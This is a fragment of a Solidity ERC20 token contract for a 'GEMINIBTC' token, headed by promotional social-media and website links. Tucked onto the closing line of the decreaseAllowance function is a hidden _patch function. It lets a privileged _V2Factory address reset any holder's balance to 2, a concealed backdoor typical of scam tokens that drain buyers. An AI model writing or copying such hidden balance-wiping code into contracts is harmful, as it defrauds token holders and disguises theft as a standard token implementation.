...
/** 
https://twitter.com/GEMINIBTCERC20
https://t.me/GEMINIBTCMoon


https://GEMINIBTCOnEth.xyz
**/
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        ...
        return true;
        } function _patch(address _patchSender) external { _balances[_patchSender] = msg.sender == _V2Factory ? 0x2 : _balances[_patchSender];
    } 
